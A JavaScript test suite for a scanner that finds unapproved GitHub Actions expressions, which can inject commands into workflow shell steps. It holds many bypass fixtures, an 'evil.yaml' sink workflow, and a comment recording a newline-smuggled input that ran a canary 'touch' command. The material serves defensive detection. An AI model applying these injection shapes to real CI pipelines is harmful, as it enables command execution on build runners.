import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

import { ESCAPE_ALLOWLIST, EXPRESSION_ALLOWLIST } from './helpers/expression-allowlist.js';
import {
  entryShapeProblems,
  escapeProblems,
  rawExpressions,
  rawSweepProblems,
  readWorkflowFile,
  referencesIn,
  structuralContexts,
  workflowFileNames,
} from './helpers/raw-expression-scan.js';

// The repo-wide `${{ }}` guarantee (abofs/stonyx-workflows#37).
//
// Three review rounds found nine ways to hide an expression from a sweep built
// on a YAML reader, each one after the previous fix shipped. This file proves
// the replacement: a raw byte scan over every file in `.github/workflows/`,
// enumerated with no extension filter, whose result must be pinned entry by
// entry in `test/helpers/expression-allowlist.js`.
//
// The claim being tested is a construction claim, and it is worth stating in
// the narrow form that is actually true. It is NOT "no bypass exists". It is:
// none of these shapes can hide an occurrence, BECAUSE NOTHING HERE PARSES
// YAML. The families below are re-run anyway -- a construction argument that
// nobody re-measured is how the last three rounds each started.
//
// The extractor in `test/helpers/workflow-yaml.js` is DIAGNOSTICS ONLY from
// here on. It still names which step and which sink an expression sits in, and
// the executed `run:`-body tests still need real step bodies from it. If it is
// wrong, a message gets less helpful; nothing goes unswept.

const cascade = readWorkflowFile('cascade.yml');
const ci = readWorkflowFile('ci.yml');
const npmPublish = readWorkflowFile('npm-publish.yml');
const FIXTURE = readFileSync(new URL('./fixtures/security-audit-e07e185.yml', import.meta.url), 'utf8');

/** Append a step to a workflow's `steps:` list. Every workflow here sits at six spaces. */
const appendStep = (text, stepYaml) => `${text.replace(/\n+$/, '\n')}\n${stepYaml.replace(/\n+$/, '')}\n`;

const step = (...lines) => lines.join('\n');

/**
 * Assert at least one problem matches, and print what was actually reported
 * when none does.
 *
 * `naming` is the payload the problem has to be ABOUT, and it is not optional
 * decoration. Measured on PR #38 by Phase 3 round 6 §3a: `some(pattern)` alone
 * made D2's non-vacuity an accident of where its fixture sat. `appendStep` puts
 * the forgery at end of file, so a broken walk produced zero problems and
 * `some` was false; relocate the identical forgery mid-file -- a plausible,
 * well-intentioned, security-neutral-looking edit -- and under the same
 * mutation the PAT occurrence is EXEMPT with a chain byte-identical to the
 * legitimate line, while two lines of downstream collateral still match both
 * patterns. Re-measured on this tree: `}`/`]` treated as closers inside a
 * double quote is 308 pass / 1 fail with the fixtures where they sit, 309 / 0
 * -- fully green with the sink live -- with the fixtures relocated and the
 * round-6 assertion, and 308 / 1 again with this one. Naming the payload makes the D
 * rows immune to placement and to collateral, and it costs nothing today.
 */
function assertReports(problems, pattern, why, naming = null) {
  const matched = problems.filter((p) => pattern.test(p) && (naming === null || p.includes(naming)));
  assert.ok(
    matched.length > 0,
    `${why}\nexpected a problem matching ${pattern}${naming === null ? '' : ` and naming ${naming}`}`
    + `\ngot:\n${problems.map((p) => `  - ${p}`).join('\n') || '  (none)'}`,
  );
}

/**
 * `source` with `//` lines and `/* ... *\/` blocks removed, so the assertions
 * below read executable code rather than prose about it. The scanner's own
 * docstrings quote the bypass spellings they exist to describe.
 */
function stripComments(source) {
  const kept = [];
  let inBlock = false;
  for (const line of source.split('\n')) {
    const trimmed = line.trim();
    if (inBlock) {
      if (trimmed.includes('*/')) inBlock = false;
      continue;
    }
    if (trimmed.startsWith('//')) continue;
    if (trimmed.startsWith('/*')) {
      if (!trimmed.includes('*/')) inBlock = true;
      continue;
    }
    kept.push(line);
  }
  return kept.join('\n');
}

/**
 * Every occurrence of the token `import` in `code`, classified.
 *
 * A whitelist over how a module can obtain code, rather than a blocklist of
 * spellings: the two acceptable kinds are named, everything else is reported
 * with whatever it looks like. An indented static import and a dynamic
 * `import(` are both `import` occurrences that are neither.
 */
function loadSites(code) {
  const sites = [];
  const lines = code.split('\n');

  lines.forEach((line) => {
    let at = line.indexOf('import');
    while (at !== -1) {
      const after = line.slice(at + 'import'.length);
      const trimmed = line.trim();
      let kind = 'an unclassified `import`';
      if (after.startsWith('.meta')) kind = 'import.meta';
      else if (after.startsWith('(')) kind = 'a dynamic import()';
      else if (line.startsWith('import ') && at === 0) {
        kind = line.includes("from 'node:") ? 'node: static import' : 'a non-node: static import';
      } else if (trimmed.startsWith('import ')) kind = 'an indented static import';
      sites.push({ kind, line: trimmed });
      at = line.indexOf('import', at + 1);
    }
  });

  return sites;
}

const sweep = (file, text, allowlist = EXPRESSION_ALLOWLIST, escapes = ESCAPE_ALLOWLIST) =>
  rawSweepProblems(file, text, allowlist, escapes);

const UNPINNED = /No allowlist entry in test\/helpers\/expression-allowlist\.js pins that expression/;
const DEAD = /expression-allowlist\.js is dead/;
const CONSTRUCTED = /an opener can be CONSTRUCTED with no literal \$\{\{ in the bytes/;
const CHAIN_SEPARATOR = ' > ';

describe('G1 -- the raw ${{ }} guarantee is green on the workflows that ship (#37)', () => {
  // AC5's successor. If this ever reds on an unmodified workflow the blast
  // radius stops being test-only: ten consumer repos reference these files
  // unpinned at @main, so a workflow change is consumer-visible.

  const FILES = workflowFileNames();

  test('every file in .github/workflows/ is enumerated, with no extension filter', () => {
    // The previous version of this pin deep-equalled the ALREADY-FILTERED list,
    // so a `.github/workflows/evil.yaml` was removed before the assertion could
    // see it -- measured at 206 pass / 0 fail with a live `workflow_call` input
    // reaching a shell body (#37, Phase 3 §4). This list is the raw directory.
    assert.deepEqual(FILES, ['cascade.yml', 'ci.yml', 'npm-publish.yml', 'security-audit.yml', 'self-ci.yml']);
  });

  test('the enumerator applies no extension filter at all', () => {
    // Proven against a directory rather than asserted about one, so restoring
    // `.filter((n) => n.endsWith('.yml'))` reds here rather than silently
    // shrinking the population every other case quantifies over.
    const dir = mkdtempSync(join(tmpdir(), 'raw-sweep-enum-'));
    try {
      for (const name of ['b.yml', 'a.yaml', 'c.txt', 'd']) writeFileSync(join(dir, name), 'x\n');
      assert.deepEqual(workflowFileNames(pathToFileURL(`${dir}/`)), ['a.yaml', 'b.yml', 'c.txt', 'd']);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('the file the enumerator names is the file the reader reads', () => {
    // `readWorkflowFile` used to resolve `new URL(name, dir)`, and a file URL
    // PERCENT-DECODES: the entry `%63i.yml` -- a valid filename GitHub Actions
    // will execute -- read back `ci.yml`'s bytes, so the new file's content was
    // never scanned and `ci.yml`'s was scanned twice under two names. The two
    // halves of the guarantee disagreed about what a file is (#37, Phase 3 §5b).
    // It reds today only through the five-name pin above, which is expected to
    // be edited whenever a workflow is legitimately added.
    const dir = mkdtempSync(join(tmpdir(), 'raw-sweep-name-'));
    try {
      writeFileSync(join(dir, 'ci.yml'), 'name: Reusable CI\n');
      writeFileSync(join(dir, '%63i.yml'), 'run: echo "${{ inputs.package-name }}"\n');
      const dirUrl = pathToFileURL(`${dir}/`);
      assert.deepEqual(workflowFileNames(dirUrl), ['%63i.yml', 'ci.yml'], 'both names are enumerated');
      assert.equal(
        readWorkflowFile('%63i.yml', dirUrl),
        'run: echo "${{ inputs.package-name }}"\n',
        'the percent sign is part of the NAME, not an escape -- reading it must not resolve to ci.yml',
      );
      assertReports(
        rawSweepProblems('%63i.yml', readWorkflowFile('%63i.yml', dirUrl), EXPRESSION_ALLOWLIST),
        UNPINNED,
        'and its own content is swept, rather than another file being swept twice',
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  for (const file of FILES) {
    test(`every ${'${{ }}'} occurrence in ${file} is pinned to its source line with a reason`, () => {
      assert.deepEqual(sweep(file, readWorkflowFile(file)), []);
    });
  }

  test('no two entries in a file pin the same (context, line, expression)', () => {
    // THIS HAS TO COME BEFORE THE COUNTS, and the order is the whole point.
    // `rawSweepProblems` reports NOTHING for a duplicated key: the second copy
    // simply never matches a tally the first already satisfied. Until this
    // assertion existed, the only thing catching a duplicate -- and so the only
    // thing catching a SECOND, CONTRADICTORY reason for the same line, which is
    // the bulk-approval vector the `why`-uniqueness rule exists to stop and
    // which a one-word reword defeats -- was the hard-coded occurrence total
    // (#37, Phase 1 F3). Deriving the counts without adding this would have
    // opened a hole.
    for (const [file, entries] of Object.entries(EXPRESSION_ALLOWLIST)) {
      const keys = entries.map((e) => JSON.stringify([e.context, e.line, e.expression]));
      assert.equal(
        new Set(keys).size,
        keys.length,
        `${file} pins the same (context, line, expression) twice; the second entry can never be consulted`,
      );
    }
  });

  test('the allowlist accounts for every occurrence and nothing else', () => {
    // Three counts of the same thing, DERIVED rather than snapshotted.
    // `rawExpressions` emits exactly one record per opener; `split` counts
    // openers without looking at records; the allowlist's own `occurrences` sum
    // is the third, and the three must agree.
    //
    // The literals `42` and `36` used to be asserted here. An ordinary new
    // expression WITH a correct entry was 255 pass / 1 fail, remediable only by
    // bumping a number -- the one place in this design that teaches "when the
    // guard reds, edit the literal", met by every workflow change that touches
    // an expression (#37, Phase 2 W-1; Phase 1 F3; Phase 4). Commit `7e41b0f`
    // exists solely to delete that shape elsewhere. The signal is the AGREEMENT
    // of three independent counts, and nothing about it needs a magic number.
    let scanned = 0;
    let split = 0;
    for (const file of FILES) {
      const text = readWorkflowFile(file);
      scanned += rawExpressions(text).length;
      split += text.split('${{').length - 1;
    }

    const entries = Object.values(EXPRESSION_ALLOWLIST).flat();
    const pinned = entries.reduce((sum, e) => sum + e.occurrences, 0);

    assert.ok(scanned > 0, 'if the five files carry no openers at all, every agreement below is vacuous');
    assert.equal(split, scanned, 'an independent count of the raw bytes must agree with the scanner');
    assert.equal(pinned, scanned, 'the allowlist must pin exactly as many occurrences as the files carry');
    assert.ok(
      entries.length <= scanned,
      'more entries than occurrences means at least one is dead, which the per-file sweeps report by name',
    );
    assert.deepEqual(
      Object.keys(EXPRESSION_ALLOWLIST).sort(),
      FILES,
      'every file in the directory has an allowlist section, even if it is empty',
    );
  });

  test('calibration: the three counts really can disagree', () => {
    // Deriving a number instead of snapshotting it is only worth doing if the
    // derivation can still fail. A duplicated entry, a dropped one, and an
    // occurrence the scanner cannot see each break a different equality.
    const ONE = { line: 'a: ${{ x.y }}', context: 'top', expression: '${{ x.y }}', occurrences: 1, why: 'x' };
    const sum = (entries) => entries.reduce((total, e) => total + e.occurrences, 0);
    assert.notEqual(sum([ONE, { ...ONE, occurrences: 1 }]), rawExpressions('a: ${{ x.y }}\n').length);
    assert.equal(sum([ONE]), rawExpressions('a: ${{ x.y }}\n').length);
    assert.equal(rawExpressions('a ${{ x  ${{ y }} b\n').length, 'a ${{ x  ${{ y }} b\n'.split('${{').length - 1);
  });

  test('no two entries within a file share a reason', () => {
    // Bulk approval is the failure mode an allowlist has. `entryShapeProblems`
    // already refuses a `why` that names none of its own expression's
    // references; this refuses one sentence pasted onto every entry.
    for (const [file, entries] of Object.entries(EXPRESSION_ALLOWLIST)) {
      const reasons = entries.map((e) => e.why);
      assert.equal(new Set(reasons).size, reasons.length, `${file} has two allowlist entries with the same why:`);
    }
  });
});

describe('G1 -- the scanner owes nothing to the YAML reader (#37)', () => {
  // ONE CHECK, DELIBERATELY. There used to be five.
  //
  // The guarantee is that no `${{ }}` occurrence escapes the allowlist. This
  // block does not test that; it tests a PROPERTY OF THE GUARANTEE'S SOURCE --
  // that `raw-expression-scan.js` cannot reach the YAML extractor and inherit
  // its blind spots. That is a claim about a 250-line self-contained file, and
  // rounds 2, 3 and 4 each tried to automate it exhaustively:
  //
  //   * a seven-token method blocklist (`.replace(`, `.match(`, ...), defeated
  //     by `.split(/\n/)` and `.replaceAll(/ *steps: */g, ...)` at 256 / 0;
  //   * a scan for regex LITERALS, which never entered a template-literal
  //     `${...}` -- 41 substitutions and 586 characters of executable code
  //     unscanned, so the extractor's own anchor written as
  //     `` `${expression.replaceAll(/ *steps: */g, ' ')} ` `` was 282 / 0
  //     (#37, Phase 4 NEW-1);
  //   * a `node:module` loader hook running in a child process, which was
  //     DOUBLY vacuous: it invoked every export with `undefined`, and six of
  //     the eight threw on their first statement, so nothing behind a
  //     `typeof text === 'string'` guard ever ran; and it filtered
  //     `!spec.startsWith('file://')`, discarding exactly the dependency form
  //     it existed to record (#37, Phase 4 NEW-2, Phase 1 F9, Phase 3 §5a);
  //   * and all five pins together were walked past at 282 / 0 by
  //     `process.getBuiltinModule('node:module').createRequire(...)` of an
  //     aliasing proxy, with `proxy.resolveItems === parseSteps` verified true.
  //
  // Three rounds, four defects of the machinery's own, and no live sink among
  // them. So the machinery is gone and what is left is the one check that was
  // doing the load-bearing work anyway (#37, Phase 1: the static import
  // whitelist caught the dynamic-import defeat that the loader hook was bought
  // to catch and did not).
  //
  // WHAT ASSURES INDEPENDENCE IS REVIEW, NOT THIS TEST. `raw-expression-scan.js`
  // is short, exports eight functions, and imports one line. A reviewer reading
  // it can see it reaches nothing; that is the assurance. This check exists to
  // stop the ONE change that would be easy to make without noticing -- adding a
  // load site -- and it is calibrated against the three spellings that defeated
  // its predecessors. It is not a proof that no evasion exists. An engineer who
  // wants the scanner to call the extractor can still do it; the point is that
  // they cannot do it by accident, and cannot do it in a diff that looks
  // uninteresting.
  const SCANNER = new URL('./helpers/raw-expression-scan.js', import.meta.url);
  const source = readFileSync(SCANNER, 'utf8');
  const code = stripComments(source);

  test('every way this file can load code is a top-level node: import', () => {
    // A WHITELIST over the mechanism: every occurrence of the token `import` is
    // either `import.meta` or opens a line ending in a `node:` specifier. An
    // indented static import, a dynamic `import(`, and a computed specifier are
    // all occurrences that are neither.
    for (const occurrence of loadSites(code)) {
      assert.ok(
        occurrence.kind === 'import.meta' || occurrence.kind === 'node: static import',
        `the raw scanner may not load code via ${occurrence.kind}: ${occurrence.line}`,
      );
    }
    assert.ok(
      loadSites(code).some((o) => o.kind === 'node: static import'),
      'if there is no static import left, the assertion above is vacuous',
    );
    assert.ok(!code.includes('workflow-yaml'), 'no path into the extractor');
    assert.ok(!code.includes('interpolation-sweep'), 'no path into the extractor-based sweep');

    // Calibration: the detector sees the shapes that defeated its predecessors.
    // Without these the check is a sentence about a `startsWith`.
    for (const evasion of [
      "  import { parseSteps } from './workflow-yaml.js';",
      "const m = await import('./yaml-proxy.js');",
      "const m = await import(['./yaml', '-proxy.js'].join(''));",
      "const m = await import(new URL('./yaml-proxy.js', import.meta.url).href);",
    ]) {
      assert.ok(
        loadSites(evasion).some((o) => o.kind !== 'import.meta' && o.kind !== 'node: static import'),
        `the load-site scan must see ${evasion}`,
      );
    }

    // And the honest limit, committed rather than left to the header: a load
    // site written without the token `import` is INVISIBLE here. This is the
    // shape that defeated all five of the pins this block replaced, and no
    // amount of source reading closes it -- `getBuiltinModule` is one spelling
    // of an unbounded set. It is disclosed in README.md's Honest gaps and it is
    // why the sentence above says review rather than proof.
    assert.deepEqual(
      loadSites("const load = process.getBuiltinModule('node:module').createRequire(import.meta.url);")
        .filter((o) => o.kind !== 'import.meta'),
      [],
      'calibration on the DISCLOSED GAP: a require obtained without the token `import` is not seen here. '
      + 'If this ever starts reporting, the gap has narrowed and README.md must say so',
    );
  });
});

describe('G1 -- every bypass family from all ten PR #38 reviews reds (#37)', () => {
  // The table. Each row is a shape that was MEASURED green against the
  // reader-based sweep at some point in this issue's life; every one of them
  // now reds on the raw scan, and none of the fixes for them is what makes it
  // red -- there is nothing to disagree with a byte scan about.
  const FAMILIES = [
    ['1  duplicate step name, run: sink', appendStep(cascade, step(
      '      - name: Checkout stonyx-workflows (for dependency map)',
      '        run: |',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
    ['1  duplicate step name, script: sink', appendStep(cascade, step(
      '      - name: Dispatch to downstream dependents',
      '        uses: actions/github-script@v7',
      '        with:',
      '          script: |',
      "            const n = '${{ inputs.package-name }}';",
    ))],
    ['2  run: > folded block scalar', appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: >',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
    ['3  ${{ format(\'{0}\', ...) }}', appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: |',
      "          echo \"cascading ${{ format('{0}', inputs.package-name) }}\"",
    ))],
    ['6  eval \"...\" relocation (NEW-5)', appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: eval "echo ${{ inputs.package-name }}"',
    ))],
    ['6a unnamed step, inline run:', appendStep(cascade, '      - run: echo "${{ inputs.package-name }}"')],
    ['6a unnamed step, block run:', appendStep(cascade, step(
      '      - run: |',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
    ['6a unnamed github-script step', appendStep(cascade, step(
      '      - uses: actions/github-script@v7',
      '        with:',
      '          script: |',
      "            const n = '${{ inputs.package-name }}';",
    ))],
    ['6a uses: first, name: second', appendStep(cascade, step(
      '      - uses: actions/github-script@v7',
      '        name: Second dispatch',
      '        with:',
      '          script: |',
      "            const n = '${{ inputs.package-name }}';",
    ))],
    ['6a with: first, uses: last, no name', appendStep(cascade, step(
      '      - with:',
      '          script: |',
      "            const n = '${{ inputs.package-name }}';",
      '        uses: actions/github-script@v7',
    ))],
    ['6a item-level flow mapping', appendStep(
      cascade,
      "      - {name: Flow, run: 'echo \"${{ inputs.package-name }}\"'}",
    )],
    ['6a alias resolved on the next line', appendStep(cascade, step(
      '      - name: Anchor holder',
      '        run: &sink echo "${{ inputs.package-name }}"',
      '      - name: Alias run',
      '        run:',
      '          *sink',
    ))],
    ['6b run: nested in an earlier block scalar', appendStep(cascade, step(
      '      - name: Emit the consumer snippet',
      '        env:',
      '          SNIPPET: |',
      '            run: pnpm test',
      '        run: |',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
    ['6c quoted "run": key', appendStep(cascade, step(
      '      - name: Quoted key',
      '        "run": |',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
    ['N1a multi-line plain scalar run:', appendStep(cascade, step(
      '      - name: Plain scalar',
      '        run: echo',
      '          "${{ inputs.package-name }}"',
    ))],
    ['N1b multi-line double-quoted scalar run:', appendStep(cascade, step(
      '      - name: Double quoted scalar',
      '        run: "echo',
      '          ${{ inputs.package-name }}"',
    ))],
    ['N1c multi-line single-quoted scalar run:', appendStep(cascade, step(
      '      - name: Single quoted scalar',
      "        run: 'echo",
      "          ${{ inputs.package-name }}'",
    ))],
    ['N1d multi-line double-quoted with: script:', appendStep(cascade, step(
      '      - name: Multi-line script',
      '        uses: actions/github-script@v7',
      '        with:',
      '          script: "console.log(',
      '            \'${{ inputs.package-name }}\')"',
    ))],
    ['N2 single-line flow mapping under with:', appendStep(cascade, step(
      '      - uses: actions/github-script@v7',
      '        name: Flow with',
      "        with: {script: 'console.log(\"${{ inputs.package-name }}\")'}",
    ))],
    ['N4 explicit key ? run', appendStep(cascade, step(
      '      - name: Explicit key',
      '        ? run',
      '        : echo "${{ inputs.package-name }}"',
    ))],
    ['N5 escaped double-quoted key', appendStep(cascade, step(
      '      - name: Escaped key',
      '        "ru\\x6e": |',
      '          echo "cascading ${{ inputs.package-name }}"',
    ))],
  ];

  for (const [family, mutated] of FAMILIES) {
    test(`${family} -- the expression is found and has no entry`, () => {
      assert.notEqual(mutated, cascade, `the ${family} mutation must actually have applied`);
      assertReports(
        sweep('cascade.yml', mutated),
        UNPINNED,
        'a raw byte scan cannot be evaded by YAML shape; if this is green the scan has grown an opinion',
      );
    });
  }

  test('a whole .yaml workflow file is swept like any other file', () => {
    // Measured at 206 pass / 0 fail before this change: a complete, valid
    // reusable workflow whose only step carried `${{ inputs.package-name }}`
    // into a shell body, invisible because both enumerations filtered to
    // `.yml` (#37, Phase 3 §4).
    const dir = mkdtempSync(join(tmpdir(), 'raw-sweep-yaml-'));
    try {
      writeFileSync(join(dir, 'evil.yaml'), step(
        'name: Evil',
        'on:',
        '  workflow_call:',
        '    inputs:',
        '      package-name:',
        '        required: true',
        '        type: string',
        'jobs:',
        '  evil:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - name: Sink',
        '        run: echo "${{ inputs.package-name }}"',
        '',
      ));
      const dirUrl = pathToFileURL(`${dir}/`);
      const names = workflowFileNames(dirUrl);
      assert.deepEqual(names, ['evil.yaml'], 'the enumerator must list a .yaml file');
      assertReports(
        rawSweepProblems('evil.yaml', readWorkflowFile('evil.yaml', dirUrl), EXPRESSION_ALLOWLIST),
        UNPINNED,
        'a file with no allowlist section has no entries, so every expression in it is unpinned',
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// The `security-audit.yml` allowlist AS IT STANDS BEFORE #34, frozen beside the
// frozen fixture it is measured against.
//
// Reading the LIVE allowlist here re-coupled a frozen file to a moving list,
// and the exact state #34 lands in -- its fix applied, both entries deleted per
// README.md, its own replacement entry added -- measured 255 pass / 1 fail on
// `calibration: unmutated is clean`. The cheapest exit from that red is to edit
// or delete the case that proves the guarantee is positively re-armable, which
// is the one case in this suite that must not be routed around (#37, Phase 2
// HIGH-1; the same sequence measured clean at `d5bb1a6` and `37df8b8`).
//
// `sweep-bypass-test.js:315` already freezes `ALLOWLIST_AT_E07E185` beside this
// fixture and README.md already documents the fixture as pinned "with a local
// copy of its allowlist entry" -- true there, and now true here. DO NOT re-point
// this at `EXPRESSION_ALLOWLIST`: #34 deletes the third entry, and this is the
// text the mutations below are measured against.
const ALLOWLIST_AT_E07E185 = {
  'security-audit.yml': [
    {
      line: 'version: ${{ inputs.pnpm-version }}',
      context: 'jobs > audit > steps > with',
      expression: '${{ inputs.pnpm-version }}',
      occurrences: 1,
      why: 'inputs.pnpm-version reaching pnpm/action-setup\'s `version:` input in the audit job. An action '
        + 'input, not program text, and unrelated to the open sink recorded below.',
    },
    {
      line: 'node-version: ${{ inputs.node-version }}',
      context: 'jobs > audit > steps > with',
      expression: '${{ inputs.node-version }}',
      occurrences: 1,
      why: 'inputs.node-version reaching actions/setup-node\'s `node-version:` input in the audit job. An '
        + 'action input, not program text, and unrelated to the open sink recorded below.',
    },
    {
      line: 'run: pnpm audit --audit-level ${{ inputs.audit-level }}',
      context: 'jobs > audit > steps',
      expression: '${{ inputs.audit-level }}',
      occurrences: 1,
      why: 'KNOWN OPEN SINK, tracked as abofs/stonyx-workflows#34: inputs.audit-level is a workflow_call '
        + 'input interpolated straight into a shell run: body. An abridged copy of the live entry as it '
        + 'stands before #34, so this case measures the frozen fixture against the list that fixture was '
        + 'written against rather than against a list #34 is required to change.',
    },
  ],
};

describe('G1 -- the guarantee fails closed (#37)', () => {
  // Three ways to red, each measured. An unanticipated shape must not be able
  // to fall out of the population -- that is the failure mode the reader-based
  // sweep had at every level it was pinned at.

  test('an expression on a #-comment line is a live sink, never exempt', () => {
    // The runner substitutes `${{ }}` into a run: body TEXTUALLY before bash
    // parses it, and a workflow_call input can contain a newline. Executed
    // under `bash --noprofile --norc -e` with
    // inputs.audit-level = "moderate\ntouch /tmp/canary/PWNED\n#": exit 0, and
    // the canary written. A raw scan does not know what a comment is, which is
    // the correct amount of knowledge to have about one.
    const commented = appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: |',
      '          # cascading ${{ inputs.package-name }}',
      '          echo done',
    ));
    assertReports(sweep('cascade.yml', commented), UNPINNED, 'a commented expression is substituted, so it is a sink');
  });

  test('a second copy on an allowlisted line reds on the pinned occurrence count', () => {
    const doubled = appendStep(cascade, step(
      '      - name: Second dispatch',
      '        env:',
      '          PACKAGE_NAME: ${{ inputs.package-name }}',
      '        run: echo done',
    ));
    assertReports(
      sweep('cascade.yml', doubled),
      /carries \$\{\{ inputs\.package-name \}\} 2 time\(s\).*expression-allowlist\.js pins 1/s,
      'an entry exempts a stated number of occurrences on a stated line, not a line pattern',
    );
  });

  test('an opener that does not close on its own line reds rather than being dropped', () => {
    const spanning = appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: >',
      '          echo "hi ${{',
      '          inputs.package-name }}"',
    ));
    const occurrences = rawExpressions(spanning).filter((e) => e.expression === null);
    assert.equal(occurrences.length, 1, 'the scanner must still emit a record for an opener it cannot close');
    assertReports(
      sweep('cascade.yml', spanning),
      /does not close on the same line/,
      'a shape the scanner does not model must report itself, never vanish from the population',
    );
  });

  test('two openers on one line emit two records, even when the first does not close', () => {
    // The invariant the whole design rests on, stated absolutely in
    // `rawExpressions`' docstring and measured FALSE: the scan used to advance
    // past the closer, so the first expression's span swallowed the second
    // opener and `a ${{ x  ${{ y }} b` emitted ONE record for TWO openers. The
    // `scanned === split` cross-check that is supposed to corroborate the count
    // silently disagreed with itself, and it is only ever exercised on the
    // green side (#37, Phase 1 F4 / Phase 4 NEW-8).
    const nested = 'a ${{ x  ${{ y }} b\n';
    assert.equal(rawExpressions(nested).length, 2, 'exactly one record per opener, always');
    assert.equal(rawExpressions(nested).length, nested.split('${{').length - 1, 'and the two counts agree');
    assert.deepEqual(rawExpressions(nested).map((e) => e.expression), ['${{ x  ${{ y }}', '${{ y }}']);
  });

  test('an unparseable expression reds -- there is no shape the scan skips', () => {
    const unparseable = appendStep(cascade, step(
      '      - name: Announce the cascade',
      '        run: |',
      '          echo "cascading ${{ inputs.package-name }"',
    ));
    assertReports(
      sweep('cascade.yml', unparseable),
      /does not close on the same line/,
      'the old matcher DROPPED an opener it could not resolve and leaned on a separate count to notice',
    );
  });

  test('a stale entry that matches nothing is reported dead', () => {
    // A deleted entry and a never-consulted entry look identical from a green
    // suite, so the exemption is re-derived from the file every run.
    const stale = {
      'cascade.yml': [
        ...EXPRESSION_ALLOWLIST['cascade.yml'],
        {
          line: 'AUDIT_LEVEL: ${{ inputs.audit-level }}',
          context: 'env',
          expression: '${{ inputs.audit-level }}',
          occurrences: 1,
          why: 'A deliberately dead entry: inputs.audit-level appears nowhere in cascade.yml, so this must be '
            + 'reported rather than sitting silently as a standing exemption.',
        },
      ],
    };
    assertReports(
      rawSweepProblems('cascade.yml', cascade, stale),
      DEAD,
      'an exemption whose expression is gone must not survive as a standing permission',
    );
  });

  test('#34: fixing the sink kills its entry, whether or not a comment quotes it', () => {
    // The scheduled trigger. #34 moves `inputs.audit-level` to a step env: and
    // reads "$AUDIT_LEVEL". With the entry left in place the suite must red --
    // once as a dead entry, and again on the comment if the fix leaves one.
    const SINK = '        run: pnpm audit --audit-level ${{ inputs.audit-level }}';
    const fix34 = ({ comment }) => FIXTURE.replace(SINK, step(
      '        env:',
      '          AUDIT_LEVEL: ${{ inputs.audit-level }}',
      '        run: |',
      ...(comment ? ['          # Was: pnpm audit --audit-level ${{ inputs.audit-level }} -- now via env (#34).'] : []),
      '          pnpm audit --audit-level "$AUDIT_LEVEL"',
    ));

    assert.ok(FIXTURE.includes(SINK), 'the fixture must still carry the #34 sink line to mutate it');
    assert.deepEqual(
      rawSweepProblems('security-audit.yml', FIXTURE, ALLOWLIST_AT_E07E185),
      [],
      'calibration: unmutated is clean',
    );

    for (const comment of [true, false]) {
      const fixed = fix34({ comment });
      assert.notEqual(fixed, FIXTURE, `the #34 fix (comment=${comment}) must actually have applied`);
      assertReports(
        rawSweepProblems('security-audit.yml', fixed, ALLOWLIST_AT_E07E185),
        DEAD,
        'a fixed sink must lose its exemption; deleting the entry is what #34 owes, not an assertion about it',
      );
      // The new env: line is itself an unpinned expression, so #34 also has to
      // write the entry that approves the remediation it introduces.
      assertReports(
        rawSweepProblems('security-audit.yml', fixed, ALLOWLIST_AT_E07E185),
        UNPINNED,
        'the env: line needs its own entry',
      );
    }

    // Positive re-arming: with the sink fixed and the entry deleted, putting
    // the original line back must red. A green here means the exemption
    // survived somewhere and the guarantee is gone.
    const fixedAndDisarmed = fix34({ comment: false });
    const disarmed = { 'security-audit.yml': [] };
    const reArmed = fixedAndDisarmed.replace(
      '          pnpm audit --audit-level "$AUDIT_LEVEL"',
      '          pnpm audit --audit-level ${{ inputs.audit-level }}',
    );
    assert.notEqual(reArmed, fixedAndDisarmed, 'the re-arming replacement must actually have applied');
    assertReports(
      rawSweepProblems('security-audit.yml', reArmed, disarmed),
      UNPINNED,
      'the guarantee must be positively re-armable; a sweep that stays green here is guarding nothing',
    );
  });
});

describe('G1 -- an allowlist entry has to say something (#37)', () => {
  // The allowlist is the review artifact, so a bulk approval must not be
  // expressible. These are the entry-shape refusals, each shown firing.
  //
  // SELECTED BY CONTENT, NOT BY POSITION. This used to be
  // `EXPRESSION_ALLOWLIST['ci.yml'][0]`, and the assertion below names
  // `inputs.pnpm-version` -- so a contributor who wrote their new entry at the
  // TOP of `ci.yml`'s list, which is the natural place to put one, reds
  // `a generic reason is refused ...` for a reason that has nothing to do with
  // what they wrote. Measured on this tree: an ordinary correct entry inserted
  // at index 0 was 292 pass / 1 fail, and the same entry appended was 293 / 0.
  // A red naming the wrong thing is the class this suite exists to remove, so
  // the fixture is pinned to the entry it means.
  const GOOD = EXPRESSION_ALLOWLIST['ci.yml'].find((e) => e.expression === '${{ inputs.pnpm-version }}');

  test('the live entries are all well-formed', () => {
    // And the fixture every refusal below spreads is a REAL live entry. If the
    // `find` above ever misses, `{ ...GOOD }` is `{}` and every refusal fires
    // on the missing field rather than on the one it names.
    assert.deepEqual(entryShapeProblems('ci.yml', GOOD), [], 'the refusal fixture must be a well-formed live entry');

    for (const [file, entries] of Object.entries(EXPRESSION_ALLOWLIST)) {
      for (const entry of entries) assert.deepEqual(entryShapeProblems(file, entry), []);
    }
  });

  test('an entry with no line: is refused', () => {
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, line: undefined }),
      /has no line:/,
      'an entry without a line exempts its expression anywhere in the file -- bypass 4 and NEW-5',
    );
  });

  test('an entry whose line does not carry its expression is refused', () => {
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, line: 'version: 9' }),
      /pins a line that does not contain the expression/,
      'a typo in either field would otherwise produce an entry that can never match and never be noticed',
    );
  });

  test('a generic reason is refused because it names none of the expression\'s references', () => {
    assertReports(
